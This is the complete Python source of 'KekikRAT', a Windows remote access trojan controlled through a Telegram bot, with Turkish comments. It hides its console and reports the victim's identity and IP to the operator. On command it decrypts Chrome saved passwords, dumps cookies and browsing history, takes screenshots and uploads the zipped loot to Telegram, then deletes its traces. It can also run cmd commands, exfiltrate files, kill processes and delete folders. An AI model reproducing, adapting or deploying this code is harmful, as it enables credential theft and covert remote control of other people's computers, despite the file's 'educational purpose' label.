#!/usr/bin/env python
#! -*- coding: utf-8 -*-
# Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.

import os                   # Dizinler ve dosyalarla çalışmak için
import platform             # PC bilgileri için
import webbrowser           # Tarayıcıda bağlantı açtırmak için
import subprocess           # Kill Process(İşlem Sonlandırma) Kullanmak için
import shutil               # Tarayıcı verilerini kopyalamak için
import sqlite3              # Tarayıcıdan çekilen veritabanlarıyla çalışmak için
import win32crypt           # Tarayıcıdan çekilen şifrelenmiş verileri çözmek için
from PIL import ImageGrab   # Ekran görüntüsü almak için
import zipfile              # Topladığımız verileri Zip'lemek için
import requests             # Telegram'a Belge ve Ekran görüntüsü göndermek için
import telebot              # Esas oğlanımız TeleBot

#Hadi Başlayalım..
def WindowsTerminaliGizle(): # Windows'da betiği çalıştırdıktan sonra terminalin görünmez olması için fonksiyonumuz
    import win32console, win32gui
    Terminal = win32console.GetConsoleWindow()
    win32gui.ShowWindow(Terminal, 0)
#WindowsTerminaliGizle() # Eğer Windows'da Terminalin gizlenmesini istiyosanız aktifleştirin
# -- pyinstaller --onefile KekikRAT_v1.py --

# / Telegram Bağlantısı ################################################
bot_token = "XXXX:XXXX"                                # Bot Token
chat_id = "XXXX"                                       # Chat ID

KekikRAT = telebot.TeleBot(bot_token)  # telebot'a Tokenimizi bağladık
# / Telegram Bağlantısı ################################################

# / Bağlantı Geldi #################################################
r = requests.get('http://ip.42.pl/raw') # Harici IP'yi bulmak için bir GET isteği yolluyoruz

kullanici_adi = os.getlogin()    # Kullanıcı Adı Değişkeni tanımlıyoruz
bilgisayar_adi = platform.node() # Bilgisayar Adı Değişkeni
ip = r.text                     # IP Değişkeni tanımlıyoruz
isletim_sistemi = platform.system()      # İşletim Sistemi Bilgisi
bellenim_surumu = platform.release()   # Bellenim Sürümü Bilgisi
islemci = platform.processor()  # İşlemci Özellikleri

KekikRAT.send_chat_action(chat_id, 'typing') # Yazıyor Aksiyonu
KekikRAT.send_message(chat_id,
                   "⚠️ Bağlantı Geldi ⚠️\n\n" +
                   kullanici_adi + '@' + bilgisayar_adi +
                   "\n\t" + ip +
                   "\n\nOS : " + isletim_sistemi + ' | ' + bellenim_surumu) # Mesaj gönder
# / Bağlantı Geldi #################################################

# / Basla Komutu ########################################################################
@KekikRAT.message_handler(commands=['basla', 'Basla']) # Basla Komutunu bekliyorum
def baslangic(command): # Komut yürütülürse
    KekikRAT.send_chat_action(chat_id, 'typing') # Yazıyor Aksiyonu
    KekikRAT.send_message(chat_id,
                          "☣ KekikRAT Çalışıyor ☣" +
                          "\n\nKomutları Öğrenmek için: /komutlar yazabilirsin.." +
                          "\n\nCoded by @keyiflerolsun \nSpecial for @KekikAkademi ♥") # Mesaj gönder
# / Basla Komutu ########################################################################

# / Komutlar Komutu #######################################################################
@KekikRAT.message_handler(commands=['komutlar', 'Komutlar']) # Komutlar Komutunu bekliyorum
def komutlar(command):
    KekikRAT.send_chat_action(chat_id, 'typing') # Yazıyor Aksiyonu
    KekikRAT.send_message(chat_id,
                       "KekikRAT içinde Kullanabileceğiniz Komutlar\n\n"+
                       "/basla - Açılış, Bilgi Alma\n"+
                       "/komutlar - Kullanabileceğiniz Komutlar\n"+
                       "/sistem - Bulunduğunuz Sistem Hakkında Bilgi Verir\n"+
                       "/url_ac - domain.com | Chrome'dan Link Açar\n"+
                       "/islem_sonlandir - chrome.exe | İşlem Sonlandırır\n"+
                       "/chrome_verileri - Chrome Tarayıcı Verileri\n"+
                       "/ekran_goruntusu - Anlık Ekran Görüntüsü Verir\n"+
                       "/pwd - Geçerli Dizini Gösterir\n"+
                       "/ls - Bulunulan Dizini Listeler\n"+
                       "/cd - Dizin Değiştirir\n"+
                       "/rm_dir - Dizin Siler\n"+
                       "/indir - Dosya İndirir\n"+
                       "/cmd - CMD'den Komut Çalıştır\n"+
                       "\n\t/hakkinda - Bot Hakkında Bilgi") # Mesaj gönder
# / Komutlar Komutu #######################################################################

# / Sistem Komutu ################################################################################
@KekikRAT.message_handler(commands=['sistem', 'Sistem']) # sistem Komutunu bekliyorum
def sistem(command):
    r = requests.get('http://ip.42.pl/raw') # Harici IP'yi bulmak için bir GET isteği yolluyoruz

    kullanici_adi = os.getlogin()    # Kullanıcı Adı Değişkeni tanımlıyoruz
    bilgisayar_adi = platform.node() # Bilgisayar Adı Değişkeni
    ip = r.text                     # IP Değişkeni tanımlıyoruz
    isletim_sistemi = platform.system()      # İşletim Sistemi Bilgisi
    bellenim_surumu = platform.release()   # bellenim_surumu Sürümü Bilgisi
    islemci = platform.processor()  # İşlemci Özellikleri

    KekikRAT.send_chat_action(chat_id, 'typing') # Yazıyor Aksiyonu
    KekikRAT.send_message(chat_id,
                       "Kullanıcı : " + kullanici_adi + '@' + bilgisayar_adi +
                       "\n\nIP : " + ip +
                       "\n\nOS : " + isletim_sistemi + ' | ' + bellenim_surumu +
                       "\n\nİşlemci : " + islemci) # Mesaj gönder
# / Sistem Komutu ################################################################################

# / Url_Ac Komutu ################################################################################
@KekikRAT.message_handler(commands=["url_ac", "Url_Ac"])  # url_ac Komutunu bekliyorum
def url_ac(message):
    gelen_mesaj = "{0}".format(message.text) # İletiyi içeren değişken
    url = gelen_mesaj.split(" ")[1]          # URL içeren bir değişken tanımladık

    # https://stackoverflow.com/questions/22445217/python-webbrowser-open-to-open-chrome-browser
    chrome_dizini = 'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s'

    webbrowser.get(chrome_dizini).open(url)         # Bağlantıyı aç / veya / open_new_tab(url)
    KekikRAT.send_chat_action(chat_id, 'typing') # Yazıyor Aksiyonu
    KekikRAT.send_message(chat_id, "Hallettim!")    # Mesaj gönder
# / Url_Ac Komutu ################################################################################

# / Islem_Sonlandir Komutu ######################################################################################
@KekikRAT.message_handler(commands=["islem_sonlandir", "Islem_Sonlandir"]) # islem_sonlandir Komutunu bekliyorum
def islem_sonlandir(message):
    try: # Çalıştırmayı Dene (Hata ile karşılaşıldığında betik kapanmasın diye..)
        gelen_mesaj = "{0}".format(message.text)                         # Gelen Mesajı içeren değişken
        subprocess.call("taskkill /IM " + gelen_mesaj.split(" ")[1])     # Süreci adıyla öldür
        KekikRAT.send_chat_action(chat_id, 'typing') # Yazıyor Aksiyonu
        KekikRAT.send_message(chat_id, "Hallettim!")                    # Mesaj gönder
    except: # Hata varsa
        KekikRAT.send_chat_action(chat_id, 'typing') # Yazıyor Aksiyonu
        KekikRAT.send_message(chat_id, "Kapatılamadı!")
# / Islem_Sonlandir Komutu ######################################################################################

# / Chrome_Verileri Komutu ######################################################################################
@KekikRAT.message_handler(commands=["chrome_verileri", "Chrome_Verileri"]) # chrome_verileri Komutunu bekliyorum
def chrome_verileri(message):
    KekikRAT.send_chat_action(chat_id, 'typing') # Yazıyor Aksiyonu
    KekikRAT.send_message(chat_id, "Bekleyin...")  # "Bekleyin..." mesajını gönderiyoruz
    KekikRAT.send_chat_action(chat_id, 'typing') # Yazıyor Aksiyonu
    ###
    kullanici_adi = os.getlogin()
    chrome_yolu = os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\'
    app_data = os.getenv("APPDATA") + '\\'
    def ChromePass():
        if os.path.exists(chrome_yolu + 'Login Data'):
            # DB'yi Kopyala
            shutil.copy2(chrome_yolu + 'Login Data', app_data + f'{kullanici_adi}_LoginData.sql')
            # Veri Tabanı Bağlantısı
            conn = sqlite3.connect(app_data + f'{kullanici_adi}_LoginData.sql')
            cursor = conn.cursor()
            # Dosya Oluştur Başlık Gir
            ust_bilgi = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + kullanici_adi + ' İsimli Bilgisayarın\nChrome Tarayıcı Şifreleri\n\n'
            file = open(app_data + f'{kullanici_adi}_ChromePass.txt', "w+")  #
            file.write(ust_bilgi)
            file.close()
            # Sonuçları getir
            gelen_veri = []
            cursor.execute('SELECT signon_realm, username_value, password_value FROM logins')
            for result in cursor.fetchall():
                # Login ve url Kolonları
                login = result[1]
                url = result[0]
                try:
                    password = win32crypt.CryptUnprotectData(result[2])[1].decode()
                    if login and url and password:
                        data = '=' * 100 + '\nURL: ' + url + '\nLOGIN: ' + login + '\nPASSWORD: ' + password + '\n' + '=' * 100
                        gelen_veri.append(data)
                except:
                    pass
            for sonuc in gelen_veri:
                file = open(app_data + f'{kullanici_adi}_ChromePass.txt', "a+")  #
                file.write(sonuc + '\n')
                file.close()
    def ChromeCookies():
        if os.path.exists(chrome_yolu + 'Cookies'):
            # DB'yi Kopyala
            shutil.copy2(chrome_yolu + 'Cookies', app_data + f'{kullanici_adi}_Cookies.sql')
            # Veri Tabanı Bağlantısı
            conn = sqlite3.connect(app_data + f'{kullanici_adi}_Cookies.sql')
            cursor = conn.cursor()
            # Dosya Oluştur Başlık Gir
            ust_bilgi = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + kullanici_adi + ' İsimli Bilgisayarın\nChrome Tarayıcı Çerezleri\n\n'
            file = open(app_data + f'{kullanici_adi}_ChromeCookies.txt', "w+")  #
            file.write(ust_bilgi)
            file.close()
            # Sonuçları getir
            gelen_veri = []
            cursor.execute('SELECT * from cookies')
            for result in cursor.fetchall():
                # url ve name Kolonları
                url = result[1]
                name = result[2]
                try:
                    cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
                    if url and name and cookie:
                        data = '=' * 100 + '\nURL: ' + url + '\nCOOKIE: ' + cookie + '\nCOOKIE NAME: ' + name + '\n' + '=' * 100
                        gelen_veri.append(data)
                except:
                    pass
            for sonuc in gelen_veri:
                file = open(app_data + f'{kullanici_adi}_ChromeCookies.txt', "a+")  #
                file.write(sonuc + '\n')
                file.close()
    def ChromeDownloadHistory():
        if os.path.exists(chrome_yolu + 'History'):
            # DB'yi Kopyala
            shutil.copy2(chrome_yolu + 'History', app_data + f'{kullanici_adi}_History.sql')
            # Veri Tabanı Bağlantısı
            conn = sqlite3.connect(app_data + f'{kullanici_adi}_History.sql')
            cursor = conn.cursor()
            # Dosya Oluştur Başlık Gir
            ust_bilgi = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + kullanici_adi + ' İsimli Bilgisayarın\nChrome Tarayıcı İndirme Geçmişi\n\n'
            file = open(app_data + f'{kullanici_adi}_ChromeDownloadHistory.txt', "w+")  #
            file.write(ust_bilgi)
            file.close()
            # Sonuçları getir
            gelen_veri = []
            cursor.execute('SELECT current_path, tab_url from downloads')
            for result in cursor.fetchall():
                # dizin ve url Kolonları
                dizin = result[0]
                url = result[1]
                try:
                    if dizin and url:
                        data = '=' * 100 + '\nDizin: ' + dizin + '\nURL: ' + url + '\n' + '=' * 100
                        gelen_veri.append(data)
                except:
                    pass
            for sonuc in gelen_veri:
                file = open(app_data + f'{kullanici_adi}_ChromeDownloadHistory.txt', "a+")  #
                file.write(sonuc + '\n')
                file.close()
    def ChromeURLHistory():
        if os.path.exists(chrome_yolu + 'History'):
            # DB'yi Kopyala
            shutil.copy2(chrome_yolu + 'History', app_data + f'{kullanici_adi}_History.sql')
            # Veri Tabanı Bağlantısı
            conn = sqlite3.connect(app_data + f'{kullanici_adi}_History.sql')
            cursor = conn.cursor()
            # Dosya Oluştur Başlık Gir
            ust_bilgi = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + kullanici_adi + ' İsimli Bilgisayarın\nChrome Tarayıcı url Geçmişi\n\n'
            file = open(app_data + f'{kullanici_adi}_ChromeURLHistory.txt', "w+")  #
            file.write(ust_bilgi)
            file.close()
            # Sonuçları getir
            gelen_veri = []
            cursor.execute('SELECT title, url from urls')
            for result in cursor.fetchall():
                # baslik ve url Kolonları
                baslik = result[0]
                url = result[1]
                try:
                    if baslik and url:
                        data = '=' * 100 + '\nBaşlık: ' + baslik + '\nURL: ' + url + '\n' + '=' * 100
                        gelen_veri.append(data)
                except:
                    pass
            for sonuc in gelen_veri:
                try:
                    file = open(app_data + f'{kullanici_adi}_ChromeURLHistory.txt', "a+")  #
                    file.write(sonuc + '\n')
                    file.close()
                except:
                    pass
    def ScreenShot():
        screen = ImageGrab.grab()
        screen.save(app_data + f'{kullanici_adi}_ScreenShot.jpg')
    ChromePass()
    ChromeCookies()
    ChromeDownloadHistory()
    ChromeURLHistory()
    ScreenShot()
    def ZipFile():
        zip_adi = app_data + f'{kullanici_adi}_LOG.zip'
        yeni_zip = zipfile.ZipFile(zip_adi, 'w')
        yeni_zip.write(app_data + f'{kullanici_adi}_ChromePass.txt')
        yeni_zip.write(app_data + f'{kullanici_adi}_ChromeCookies.txt')
        yeni_zip.write(app_data + f'{kullanici_adi}_ChromeDownloadHistory.txt')
        yeni_zip.write(app_data + f'{kullanici_adi}_ChromeURLHistory.txt')
        yeni_zip.write(app_data + f'{kullanici_adi}_ScreenShot.jpg')
        yeni_zip.close()
    ZipFile()
    def imha():
        os.remove(app_data + f'{kullanici_adi}_ChromePass.txt')
        os.remove(app_data + f'{kullanici_adi}_ChromeCookies.txt')
        os.remove(app_data + f'{kullanici_adi}_ChromeDownloadHistory.txt')
        os.remove(app_data + f'{kullanici_adi}_ChromeURLHistory.txt')
        os.remove(app_data + f'{kullanici_adi}_ScreenShot.jpg')
        os.remove(app_data + f'{kullanici_adi}_LoginData.sql')
        os.remove(app_data + f'{kullanici_adi}_Cookies.sql')
        os.remove(app_data + f'{kullanici_adi}_History.sql')
    imha()
    def TelegramSend():
        KekikRAT.send_chat_action(chat_id, 'upload_document')  # Dosya Gönderiyor Aksiyonu
        loglar = {'document': open(app_data + f'{kullanici_adi}_LOG.zip', 'rb')}
        requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id, files=loglar)
    TelegramSend()
    os.remove(app_data + f'{kullanici_adi}_LOG.zip')
    ###
    KekikRAT.send_chat_action(chat_id, 'typing') # Yazıyor Aksiyonu
    KekikRAT.send_message(chat_id, "Hallettim!")
# / Chrome_Verileri Komutu ######################################################################################

# / Ekran_Goruntusu Komutu ##################################################################################################################
@KekikRAT.message_handler(commands=['ekran_goruntusu', 'Ekran_Goruntusu']) # ekran_goruntusu Komutunu bekliyorum
def ekran_goruntusu(command) :
    KekikRAT.send_chat_action(chat_id, 'typing') # Yazıyor Aksiyonu
    KekikRAT.send_message(chat_id, "Bekleyin...")                   # "Bekleyin..." mesajını gönderiyoruz
    ekran = ImageGrab.grab()                                        # ekran görüntüsü almaya eşit bir değişken oluşturduk
    ekran.save(os.getenv("APPDATA") + '\\Sreenshot.jpg')            # ekran görüntüsünü app_data klasörüne kaydettik
    ekran = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb')    # Değişkenimizi güncelliyoruz
    ekran_resmi = {'photo': ekran}                                   # POST isteği göndermek için değişken oluşturduk
    KekikRAT.send_chat_action(chat_id, 'upload_photo') # Fotoğraf Gönderiyor Aksiyonu
    requests.post("https://api.telegram.org/bot" + bot_token + "/sendPhoto?chat_id=" + chat_id , files=ekran_resmi) # Bir istekte bulunuyoruz
# / Ekran_Goruntusu Komutu ##################################################################################################################

# / PWD Komutu ##################################################################################
@KekikRAT.message_handler(commands=['pwd' , 'PWD']) # pwd Komutunu Bekliyorum
def pwd(command) :
    bulunulan_dizin = os.path.abspath(os.getcwd()) # Geçerli Dizini tanımladık
    KekikRAT.send_chat_action(chat_id, 'typing') # Yazıyor Aksiyonu
    KekikRAT.send_message(chat_id, "Geçerli dizin: \n" + (str(bulunulan_dizin)))  # Mesaj gönder
# / PWD Komutu ##################################################################################

# / LS Komutu ###################################################################################################
@KekikRAT.message_handler(commands=["ls", "LS"]) # ls Komutunu bekliyorum
def ls_dir(commands):
     listele = '\n'.join(os.listdir(path=".")) # Tüm klasörleri ve dosyaları içeren listele değişkeni tanımladık
     KekikRAT.send_chat_action(chat_id, 'typing') # Yazıyor Aksiyonu
     KekikRAT.send_message(chat_id, "{} :".format(os.getcwd()) + "\n\n" + listele)
# / LS Komutu ###################################################################################################

# / CD Komutu #############################################################################
@KekikRAT.message_handler(commands=["cd", "CD"]) # cd Komutunu bekliyorum
def cd_dir(message):
    try: # Çalıştırmayı Dene
        gelen_mesaj = "{0}".format(message.text)
        gidilecek_dizin = gelen_mesaj.split(" ")[1] # Değişken - dizin
        os.chdir(gidilecek_dizin) # Dizini değiştir
        KekikRAT.send_chat_action(chat_id, 'typing') # Yazıyor Aksiyonu
        KekikRAT.send_message(chat_id, "Şu şekilde değişti:\n\n{}".format(os.getcwd()))
    except: # Hata varsa
        KekikRAT.send_chat_action(chat_id, 'typing') # Yazıyor Aksiyonu
        KekikRAT.send_message(chat_id, "Dizine Gidilemedi!")
# / CD Komutu #############################################################################

# / RM_Dir Komutu ######################################################################
@KekikRAT.message_handler(commands = ["rm_dir", "RM_Dir"]) # rm_dir Komutunu bekliyorum
def delete_dir(message) :
    try: # Çalıştırmayı Dene
        gelen_mesaj = "{0}".format(message.text)
        silinecek_dizin = gelen_mesaj.split(" ")[1] # Değişken - Klasör adı
        os.removedirs(silinecek_dizin) # Klasörü sil
        KekikRAT.send_chat_action(chat_id, 'typing') # Yazıyor Aksiyonu
        KekikRAT.send_message(chat_id, "Bu Klasör: " + silinecek_dizin + " silindi..")
    except: # Hata varsa
        KekikRAT.send_chat_action(chat_id, 'typing') # Yazıyor Aksiyonu
        KekikRAT.send_message(chat_id, "dizin Silinemedi!")
# / RM_Dir Komutu ######################################################################

# / Indir Komutu ########################################################################
@KekikRAT.message_handler(commands=["indir", "Indir"])  # indir Komutunu bekliyorum
def dosya_indir(message):
    try: # Çalıştırmayı Dene
        KekikRAT.send_chat_action(chat_id, 'typing') # Yazıyor Aksiyonu
        KekikRAT.send_message(chat_id, "Bekleyin...")  
    
        gelen_mesaj = "{0}".format(message.text)
        dosya = gelen_mesaj.split(" ")[1]  # Dosya adını içeren değişken

        Gonderi = {'document': open(dosya, 'rb')}  # POST isteği için değişken
        
        KekikRAT.send_chat_action(chat_id, 'upload_document')  # Dosya Gönderiyor Aksiyonu
        requests.post("https://api.telegram.org/bot" + bot_token +
                      "/sendDocument?chat_id=" + chat_id , files=Gonderi)  # Dosya gönder
    except: # Hata varsa
        KekikRAT.send_chat_action(chat_id, 'typing') # Yazıyor Aksiyonu
        KekikRAT.send_message(chat_id, "Dosya İndirilemedi! (dizin İndirilmez!)")
# / Indir Komutu ########################################################################

# / CMD Komutu ###########################################################################################
@KekikRAT.message_handler(commands=["cmd", "CMD"]) # cmd Komutunu bekliyorum
def cmd_komutu(message) :
    try: # Çalıştırmayı Dene
        gelen_mesaj = "{0}".format(message.text)
        subprocess.Popen([r'C:\\Windows\\system32\\cmd.exe', gelen_mesaj.split(" ")[1]])  # Cmd'de çalıştır
        KekikRAT.send_chat_action(chat_id, 'typing') # Yazıyor Aksiyonu
        KekikRAT.send_message(chat_id, "Bitti!")
    except: # Hata varsa
        KekikRAT.send_chat_action(chat_id, 'typing') # Yazıyor Aksiyonu
        KekikRAT.send_message(chat_id, "CMD Komutu Çalıştırılamadı!")
# / CMD Komutu ###########################################################################################

# / HAKKINDA Komutu ################################################################################################
@KekikRAT.message_handler(commands = ["hakkinda", "HAKKINDA"]) # hakkinda Komutunu bekliyorum
def hakkinda(commands):
    KekikRAT.send_chat_action(chat_id, 'typing') # Yazıyor Aksiyonu
    KekikRAT.send_message(chat_id, "☣ KekikRAT v 1.0 ☣ \n\nCoded by @keyiflerolsun \nSpecial for @KekikAkademi ♥")
# / HAKKINDA Komutu ################################################################################################

KekikRAT.polling() # Çalış Aslan Parçası :)